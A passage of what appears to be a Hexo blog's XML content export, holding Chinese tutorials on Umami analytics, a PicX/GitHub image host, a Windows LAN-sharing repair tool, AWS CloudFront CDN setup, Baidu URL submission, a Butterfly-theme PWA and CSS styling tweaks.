<p>提示：如果需要删除网站，先将语言切换至 English，中文状态无法删除。</p>
<h1 id="5、配置-UMAMI-脚本至个人博客网站"><a href="#5、配置-UMAMI-脚本至个人博客网站" class="headerlink" title="5、配置 UMAMI 脚本至个人博客网站"></a>5、配置 UMAMI 脚本至个人博客网站</h1><p>网站创建完成，点击编辑按钮，选择跟踪代码，获取 umami 脚本。</p>
<p>获取后，在个人网站添加 umami 脚本即可，配置完成部署，即可开始追踪网站数据。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>web</category>
        <category>database</category>
        <category>umami</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>database</tag>
        <tag>umami</tag>
        <tag>supabase</tag>
        <tag>vercel</tag>
        <tag>postgresql</tag>
      </tags>
  </entry>
  <entry>
    <title>用PicX和Github搭建自带CDN的免费图床</title>
    <url>/posts/ee51a16d/</url>
    <content><![CDATA[<p>PicX 是一款基于 GitHub API 开发的具有 CDN 加速功能的图床管理工具，所以我们可以使用GitHub+PicX搭建免费图床。</p>
<p>首先，你需要先<a href="https://github.com/new">创建一个仓库</a>，仓库名随便，但是仓库必须<strong>公开</strong>：</p>
<p><img src="/img/picx/1.webp" alt="image"></p>
<p>然后，进入“设置（Settings）”，往下拉，找到“<strong>开发者选项（Developer settings）</strong>”，在“<strong>个人访问令牌（Personal access tokens）</strong>”选项卡下拉找到“<strong>令牌（Tokens(classic)）</strong>”，然后单击“<strong>生成新令牌（Generate new token）</strong>”，进入<a href="https://github.com/settings/tokens/new">新建令牌界面</a>，按图片里写：</p>
<p><img src="/img/picx/2.webp" alt="image"></p>
<p>写完后，生成令牌，你会得到一个token，请妥善保管，<strong>此token只显示一次</strong>。</p>
<p>接着，访问<a href="https://picx.xpoet.cn/%EF%BC%8C%E5%8D%95%E5%87%BB%E2%80%9C%E5%9B%BE%E5%BA%8A%E9%85%8D%E7%BD%AE%E2%80%9D%EF%BC%8C%E7%B2%98%E8%B4%B4%E8%BF%9B%E4%BD%A0%E7%9A%84token%EF%BC%8C%E7%84%B6%E5%90%8E%E6%8C%89%E5%9B%BE%E7%89%87%E6%8F%90%E7%A4%BA%E5%86%99%EF%BC%9A">https://picx.xpoet.cn/，单击“图床配置”，粘贴进你的token，然后按图片提示写：</a></p>
<p><img src="/img/picx/3.webp" alt="image"></p>
<p>配置完成后，就可以进入“上传图片”，上传你的图片了~</p>
<p><img src="/img/picx/4.webp" alt="image"></p>
]]></content>
      <categories>
        <category>web</category>
        <category>cdn</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>web</tag>
        <tag>cdn</tag>
        <tag>github</tag>
        <tag>picx</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows局域网共享一键修复</title>
    <url>/posts/49428fc8/</url>
    <content><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本程序专为快速解决局域网共享失败而制作，采用批处理编写，绿色开源，无需安装，安全无毒。对于PC之间共享访问失败、无法访问PC共享的打印机、安卓设备访问PC共享失败等问题都可进行修复，兼容XP及之后的Windows系统。</p>
<h1 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h1><p>本程序无需安装，在共享有问题的系统中运行（如不能判断原因，建议双方系统都运行）；</p>
<p>必须<strong>鼠标右键</strong>点击本程序，选“<strong>以管理员身份运行</strong>”，否则修复无效；</p>
<p>运行中遇到360、腾讯管家等弹出安全警告时，<strong>选择“允许”或“放行”</strong>，否则修复无效；</p>
<p><strong>修复完成后必须重启系统</strong>，否则修复无效；</p>
<p>本程序不仅可以自动完成共享和权限设置，也支持手动设置，具体方法见下；</p>
<p><em><strong>方法：</strong>打开本程序，输入“4”（共享和权限设置），按回车，打开系统的“共享文件夹”管理器，右键“共享”，可新建共享；右键右侧共享文件夹可停止共享；右键右侧共享文件夹，选择属性”，可设置文件夹的“*共享权限”和“*安全”（权限）。</em></p>
<p><img src="/img/print.webp"></p>
<p>下载:<a href="https://wwsf.lanzouw.com/iAMh114eg9id">https://wwsf.lanzouw.com/iAMh114eg9id</a> 密码:4mao</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>os</category>
        <category>windows</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>os</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>注册亚马逊云开启AWS CloudFront CDN</title>
    <url>/posts/c2d871c3/</url>
    <content><![CDATA[<h1 id="AWS-CloudFront-CDN简介"><a href="#AWS-CloudFront-CDN简介" class="headerlink" title="AWS CloudFront CDN简介"></a>AWS CloudFront CDN简介</h1><p>Amazon CloudFront （CFT）使用了一个包含 450 多个接入点和 13 个区域边缘缓存的全球网络，该网络覆盖 48 个国家&#x2F;地区的 90 多个城市。在中国的边缘节点包括：中国上海（1 个）；中国深圳（1 个）；中国中卫（1 个）；中国北京（1 个）；中国香港（4 个）完全可以用于国内站点；至于欧美那就更不用说了！</p>
<p>下图是CFT的边缘缓存、边缘节点地图：</p>
<p><img src="/img/cloudfront/1.webp"></p>
<p>无论你在世界的哪里，CFT基本上保证1秒触及，让网站流畅到飞～比较知名的新闻站Reuters，上个视频介绍过的slack，流媒体hulu使用的就是CFT服务。</p>
<p>最重要的，CFT有1TB&#x2F;月的流量而且永久免费，这对小站长来说是个大大的福利，我们只要付超出1T流量的费用即可，CFT的定价请参考：<a href="https://aws.amazon.com/cn/cloudfront/pricing/?nc=sn&loc=3">https://aws.amazon.com/cn/cloudfront/pricing/?nc=sn&amp;loc=3</a></p>
<p>仔细算算，CFT基本上不用花钱的！</p>
<h1 id="注册AWS（需验证信用卡）"><a href="#注册AWS（需验证信用卡）" class="headerlink" title="注册AWS（需验证信用卡）"></a>注册AWS（需验证信用卡）</h1><p>注册地址：<a href="https://aws.amazon.com/cn/free/">https://aws.amazon.com/cn/free/</a></p>
<h1 id="CFT的设置"><a href="#CFT的设置" class="headerlink" title="CFT的设置"></a>CFT的设置</h1><p>CloudFront设置非常简单，名词解释和设置方法可参考官方文档：<a href="https://aws.amazon.com/cn/blogs/china/configure-amazon-cloudfront-to-accelerate-the-whole-site/">https://aws.amazon.com/cn/blogs/china/configure-amazon-cloudfront-to-accelerate-the-whole-site/</a></p>
<h2 id="静态网站："><a href="#静态网站：" class="headerlink" title="静态网站："></a>静态网站：</h2><p>可直接在CFT后台直接创建分配，仅仅需要设置源域，价格级别，协议策略即可，其他保持默认即可创建成功</p>
<p>进去CloudFront创建分配，修改以下设置：</p>
<h3 id="1-源"><a href="#1-源" class="headerlink" title="1.源"></a>1.源</h3><p>源域：填写需要开启cdn的域名</p>
<h3 id="2-默认缓存行为"><a href="#2-默认缓存行为" class="headerlink" title="2.默认缓存行为"></a>2.默认缓存行为</h3><p>查看器</p>
<p>允许的 HTTP 方法，选GET, HEAD, OPTIONS, PUT, POST, PATCH, DELETE</p>
<p>缓存键和源请求</p>
<p>缓存策略选CachingOptimized</p>
<h3 id="3-Web-应用程序防火墙（WAF）"><a href="#3-Web-应用程序防火墙（WAF）" class="headerlink" title="3.Web 应用程序防火墙（WAF）"></a>3.Web 应用程序防火墙（WAF）</h3><p>不要启用安全保护</p>
<h3 id="4-自定义SSL证书，导入证书"><a href="#4-自定义SSL证书，导入证书" class="headerlink" title="4.自定义SSL证书，导入证书"></a>4.自定义SSL证书，导入证书</h3><table>
<thead>
<tr>
<th align="center">证书正文</th>
<th align="center">证书私钥</th>
</tr>
</thead>
<tbody><tr>
<td align="center">—–BEGIN CERTIFICATE—–<br />…<br />—–END CERTIFICATE—–</td>
<td align="center">—–BEGIN RSA PRIVATE KEY—–<br />…<br />—–END RSA PRIVATE KEY—–</td>
</tr>
</tbody></table>
<h2 id="动态网站："><a href="#动态网站：" class="headerlink" title="动态网站："></a>动态网站：</h2><p>我来说说比较流行的Wordpress，有个更简单的方法就是使用插件。后台搜索WPAdmin AWS CDN，作者：WPAdmin，请不要自作主张，如果你直接搜索CDN插件错误安装了W3 Total Cache的话，价格$99&#x2F;年，暂时用不到。</p>
<p>当你完成了WPAdmin AWS CDN的安装，已经有了AWS账号之后，到 IAM账户管理，添加IAM账户。当然，你在已经登陆的账户中创建反问密钥也可以，但是为了方便管理，我建议添加一个。</p>
<p>在用户中，我们添加一个用户，名字随便，权限我们选择直接附加策略,勾选ccessAnalyzerServiceRolePolicy,然后下一步下一步就完成了。</p>
<p>接着，在新用户的安全凭证中，我们创建该用户的访问密钥,请保密存储；</p>
<p>注意：aws地区不同，后台版本不同，上面的步骤有些许不同，思路一样自己找找！</p>
<p>然后，我们到wp后台设置插件，输入密钥，开启CDN。</p>
<p>在这个插件新开启CDN时候，aws后台的cloudfront会自动创建一个分配，需要等待2-3分钟后可用，<br>当我们测试后，会显示 XXXX.cloudfront.net is Currently Active，说明开启完成了。</p>
<p>现在，插件会把你网站的css、js、jpg、png、视频等静态资源地址自动改成你的分配地址，CFT也会根据用户请求开始缓存你的资源，不久，你会发现网站打开速度飞了起来！</p>
]]></content>
      <categories>
        <category>web</category>
        <category>cdn</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>cdn</tag>
        <tag>aws</tag>
        <tag>cloudfront</tag>
      </tags>
  </entry>
  <entry>
    <title>SEO百度api提交 hexo url，hexo-baidu-url-submit</title>
    <url>/posts/80490b8a/</url>
    <content><![CDATA[<p>API提交需要安装额外插件hexo-baidu-url-submit</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-baidu-url-submit --save</span><br></pre></td></tr></table></figure>

<p>在原有部署到github的站点配置的基础上，添加新站点配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">- type: git</span><br><span class="line">  repo: https://github.com/ ##仓库地址</span><br><span class="line">  branch: main</span><br><span class="line">- type: baidu_url_submitter</span><br><span class="line">baidu_url_submit:</span><br><span class="line">  count: 10 ## 提交最新的一个链接</span><br><span class="line">  host: macin.top ## 在百度站长平台中注册的域名</span><br><span class="line">  token: ## 请注意这是您的秘钥， 所以请不要把博客源代码发布在公众仓库里!</span><br><span class="line">  path: baidu_urls.txt ## 文本文档的地址， 新链接会保存在此文本文档里</span><br><span class="line">server:</span><br><span class="line">  port: 5000</span><br><span class="line">  compress: true</span><br><span class="line">  header: true</span><br></pre></td></tr></table></figure>

<p>之后每次hexo d部署后会自动进行API提交</p>
]]></content>
      <categories>
        <category>web</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo Butterfly主题加入PWA（Progressive Web Apps）</title>
    <url>/posts/ca8db3f0/</url>
    <content><![CDATA[<h1 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h1><p>PWA的全称是Progressive Web Apps，译为渐进式网络应用程序。装配了PWA以后，用户可以将网站作为WEB APP安装到自己的设备上，以原生应用般的方式浏览博客，同时借助PWA的缓存机制，能够更快速的浏览。本文讨论的是使用两种方案实现PWA。最终效果不尽相同，但是都可以实现原生应用体验和更新弹窗提示。</p>
<h1 id="图标设计："><a href="#图标设计：" class="headerlink" title="图标设计："></a>图标设计：</h1><p>在使用PWA之前，我们最好先行设计一个符合网站主题的图标。<br>可以使用<code>brandmark</code>图标设计网站，访问 <a href="https://app.brandmark.io/v3/">brandmark</a>进行图标设计。下载需要收费，不过可以截图。建议截图的时候截成正方形。</p>
<p><img src="/img/pwa/1.webp" alt="1"></p>
<p><img src="/img/pwa/2.webp" alt="2"></p>
<p><img src="/img/pwa/3.webp" alt="3"></p>
<p><img src="/img/pwa/4.webp" alt="4"></p>
<h1 id="生成图标包及manifest"><a href="#生成图标包及manifest" class="headerlink" title="生成图标包及manifest"></a>生成图标包及manifest</h1><p>因为我们最终目的是要制作一个全平台的WEB APP，所以对于图标的大小、类型适配显得格外重要。可以访问<a href="https://realfavicongenerator.net/">realfavicongenerator</a>进行图标制作及<code>manifest</code>的生成。</p>
<p><img src="/img/pwa/5.webp" alt="5"></p>
<center>选择图片</center>

<p><img src="/img/pwa/6.webp" alt="6"></p>
<center>创建所有图标
</center>

<p><img src="/img/pwa/7.webp" alt="7"></p>
<center>调整Windows磁贴图标配色
</center>

<p><img src="/img/pwa/8.webp" alt="8"></p>
<center>设置图片相对于source目录的存放路径</center>

<p><img src="/img/pwa/9.webp" alt="9"></p>
<center>设置Web App名称</center>

<p><img src="/img/pwa/10.webp" alt="10"></p>
<center>生成README.md</center>

<p><img src="/img/pwa/11.webp" alt="11"></p>
<center>选择生成</center>

<p><img src="/img/pwa/12.webp" alt="12"></p>
<center>下载资源包</center>

<p><img src="/img/pwa/13.webp" alt="13"></p>
<center>获取图标文件和manifest</center>

<h1 id="配置PWA"><a href="#配置PWA" class="headerlink" title="配置PWA"></a>配置PWA</h1><p>实现PWA的方式有许多种，本帖基于Butterfly主题文档进行详细拓展，所以只讨论使用<code>hexo-offline-popup</code>:这个插件配置较为简单，安装以后添加几行配置项即可。适合初学者。</p>
<ol>
<li><p>在博客根目录<code>[Blogroot]</code>下打开终端,输入以下指令安装<code>hexo-offline-popup</code>插件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-offline-popup --save</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改站点配置文件<code>[Blogroot]/_config.yml</code>,在站点配置文件<code>_config.yml</code>中增加以下内容:</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># hexo-offline-popup.</span></span><br><span class="line"><span class="attr">service_worker:</span></span><br><span class="line">  <span class="attr">maximumFileSizeToCacheInBytes:</span> <span class="number">3145728</span> <span class="comment"># 缓存的最大文件大小，以字节为单位，此处设置为3MB。</span></span><br><span class="line">  <span class="attr">staticFileGlobs:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">public/**/*.&#123;js,html,xml,css,png,jpg,gif,svg,webp,eot,ttf,woff,woff2&#125;</span></span><br><span class="line">    <span class="comment"># - public/**/*.&#123;html,xml&#125; #精简版使用这行即可</span></span><br><span class="line">  <span class="comment"># 静态文件合集，如果你的站点使用了例如webp格式的文件，请将文件类型添加进去。。</span></span><br><span class="line">  <span class="comment"># 注意，此处的文件类型就是会缓存下来的所有文件类型，如果不需要缓存那么多，</span></span><br><span class="line">  <span class="comment"># 而只是想判断网页更新与否，缓存html和xml即可。</span></span><br><span class="line">  <span class="attr">stripPrefix:</span> <span class="string">public</span></span><br><span class="line">  <span class="attr">verbose:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">runtimeCaching:</span></span><br><span class="line">    <span class="comment"># CDNs - should be cacheFirst, since they should be used specific versions so should not change</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">urlPattern:</span> <span class="string">/*</span> <span class="comment"># 如果你需要加载CDN資源，请配置该选项，如果沒有，可以不配置。</span></span><br><span class="line">      <span class="attr">handler:</span> <span class="string">cacheFirst</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">origin:</span> <span class="string">unpkg.com</span> <span class="comment"># 又拍云</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">urlPattern:</span> <span class="string">/*</span></span><br><span class="line">      <span class="attr">handler:</span> <span class="string">cacheFirst</span></span><br><span class="line">      <span class="attr">options:</span></span><br><span class="line">        <span class="attr">origin:</span> <span class="string">cdn.jsdelivr.net</span> <span class="comment"># jsdelivr</span></span><br><span class="line">    <span class="comment"># 更多cdn可自行参照上述格式进行配置。</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>将之前生成的图标包移入相应的目录，例如我是<code>/img/siteicon/</code>，所以放到<code>[Blogroot]/source/img/siteicon/</code>目录下。</p>
</li>
<li><p>打开图标包内的<code>site.webmanifest</code>,建议修改文件名为<code>manifest.json</code>并将其放到<code>[Blogroot]/source</code>目录下，此时还不能直接用，需要添加一些内容，以下是我的<code>manifest.json</code>配置内容，权且作为参考，其中的<code>theme_color</code>建议用取色器取设计的图标的主色调，<strong>同时务必配置start_url和name的配置项，这关系到你之后能否看到浏览器的应用安装按钮</strong>。：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>   <span class="attr">&quot;lang&quot;</span><span class="punctuation">:</span> <span class="string">&quot;en&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ltr&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;赛博宇宙&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;macin.top&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;display&quot;</span><span class="punctuation">:</span> <span class="string">&quot;standalone&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;short_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;赛博宇宙&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;scope&quot;</span><span class="punctuation">:</span> <span class="string">&quot;.&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;start_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/index.html&quot;</span></span><br><span class="line">    <span class="attr">&quot;theme_color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#212121&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;background_color&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#212121&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;icons&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/img/siteicon/android-chrome-36x36.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;36x36&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/png&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/img/siteicon/android-chrome-48x48.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;48x48&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/png&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/img/siteicon/android-chrome-72x72.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;72x72&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/png&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/img/siteicon/android-chrome-96x96.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;96x96&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/png&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/img/siteicon/android-chrome-144x144.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;144x144&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/png&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/img/siteicon/android-chrome-192x192.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;192x192&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/png&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/img/siteicon/android-chrome-256x256.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;256x256&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/png&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/img/siteicon/android-chrome-384x384.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;384x384&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/png&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;src&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/img/siteicon/android-chrome-512x512.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;sizes&quot;</span><span class="punctuation">:</span> <span class="string">&quot;512x512&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;image/png&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span>   </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>json中不要添加任何注释，不然会报错。注意最后一条内容后面不用加逗号”,” 。</p>
</li>
<li><p>打开主题配置文件<code>[Blogroot]/_config.butterfly.yml</code>,找到<code>PWA</code>配置项。添加图标路径。这里的theme_color建议改成你图标的主色调，包括<code>manifest.json</code>中的<code>theme_color</code>也是如此。</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># PWA</span></span><br><span class="line"><span class="attr">pwa:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">manifest:</span> <span class="string">/manifest.json</span></span><br><span class="line">  <span class="attr">theme_color:</span> <span class="string">&#x27;#212121&#x27;</span></span><br><span class="line">  <span class="attr">apple_touch_icon:</span> <span class="string">/img/siteicon/apple-touch-icon.png</span></span><br><span class="line">  <span class="attr">favicon_32_32:</span> <span class="string">/img/siteicon/favicon-32x32.png</span></span><br><span class="line">  <span class="attr">favicon_16_16:</span> <span class="string">/img/siteicon/favicon-16x16.png</span></span><br><span class="line">  <span class="attr">mask_icon:</span> <span class="string">/img/siteicon/safari-pinned-tab.svg</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>运行<code>hexo clean</code>之后<code>hexo generate</code>,使用<code>hexo server</code>本地查看或者<code>hexo deploy</code>部署到网站上。可以通过Chrome插件<code>Lighthouse</code>检查<code>PWA</code>配置是否生效以及配置是否正确。在Chrome浏览器中打开站点，按F12打开控制台，在右上角找到<code>Lighthouse</code>,可能没显示出来，在<code>&gt;&gt;</code>里找找。</p>
</li>
<li><p>使用<code>hexo-offline-popup</code>以后，如果还开启了<code>pjax</code>，可能遇到页面URL带着长长的后缀。形似<code>index.html?_sw-precache=fff6559539ab8f2d6043bcfa832ce38f</code>。此处感谢<a href="https://android99.me/">Android(矩阵)大佬</a>提供的方案，把以下js引入即可，实质是劫持了pjax，并对其链接进行重定向：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//重定向浏览器地址</span></span><br><span class="line">pjax.<span class="property">site_handleResponse</span> = pjax.<span class="property">handleResponse</span>;</span><br><span class="line">pjax.<span class="property">handleResponse</span> = <span class="keyword">function</span>(<span class="params">responseText, request, href, options</span>)&#123;</span><br><span class="line">  <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(request,<span class="string">&#x27;responseURL&#x27;</span>,&#123;</span><br><span class="line">    <span class="attr">value</span>: href</span><br><span class="line">  &#125;);</span><br><span class="line">  pjax.<span class="title function_">site_handleResponse</span>(responseText,request,href,options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>web</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo 博客 一张图背景设置</title>
    <url>/posts/6aedf1b/</url>
    <content><![CDATA[<p>blogroot\themes\butterfly\source\css<br>新建toututouming.css</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* 头图透明 */</span><br><span class="line">#page-header&#123;</span><br><span class="line">  background: transparent!important;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主题配置文件_config.butterfly.yml插入CSS文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">    - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/toututouming.css?1&quot;&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo 博客导航栏居中，搜索图标靠右边</title>
    <url>/posts/d045332/</url>
    <content><![CDATA[<p>blogroot\themes\butterfly\source\css<br>新建nav_middle.css</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/* 导航栏做居中处理 */</span><br><span class="line">#nav-right&#123;</span><br><span class="line">    flex:1 1 auto;</span><br><span class="line">    justify-content: flex-end;</span><br><span class="line">    margin-left: auto;</span><br><span class="line">    display: flex;</span><br><span class="line">    flex-wrap:nowrap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主题配置文件_config.butterfly.yml插入CSS文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inject:</span><br><span class="line">  head:</span><br><span class="line">    - &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/nav_middle.css?1&quot;&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>web</category>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo 博客底色透明，夜间模式遮罩，阅读模式优化</title>
    <url>/posts/1737b362/</url>
    <content><![CDATA[<p>blogroot\themes\butterfly\source\css<br>新建night.css</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">:root &#123;</span><br><span class="line">  --trans-light: rgba(255, 255, 255, 0.9);</span><br><span class="line">  --trans-dark: rgba(25, 25, 25, 0.9);</span><br><span class="line">  --border-style: 1px solid rgb(169, 169, 169);</span><br><span class="line">  --backdrop-filter: blur(5px) saturate(150%);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  /* 首页文章卡片 */</span><br><span class="line">  #recent-posts &gt; .recent-post-item &#123;</span><br><span class="line">  background: var(--trans-light);</span><br><span class="line">  border-radius: 25px;</span><br><span class="line">  border: var(--border-style);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  /* 首页侧栏卡片 */</span><br><span class="line">  #aside-content .card-widget &#123;</span><br><span class="line">  background: var(--trans-light);</span><br><span class="line">  border-radius: 18px;</span><br><span class="line">  border: var(--border-style);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  /* 文章页、普通页面、分类页、归档页 */</span><br><span class="line">  div#post,</span><br><span class="line">  div#page,</span><br><span class="line">  div#category,</span><br><span class="line">  div#archive &#123;</span><br><span class="line">  background: var(--trans-light);</span><br><span class="line">  border: var(--border-style);</span><br><span class="line">  border-radius: 20px;</span><br><span class="line">  border: var(--border-style);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  /* 导航栏 */</span><br><span class="line">  #page-header.nav-fixed #nav &#123;</span><br><span class="line">  background: rgba(255, 255, 255, 0.88);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  [data-theme=&quot;dark&quot;] #page-header.nav-fixed #nav &#123;</span><br><span class="line">  background: rgba(0, 0, 0, 0.7) !important;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  /* 夜间模式遮罩 */</span><br><span class="line">  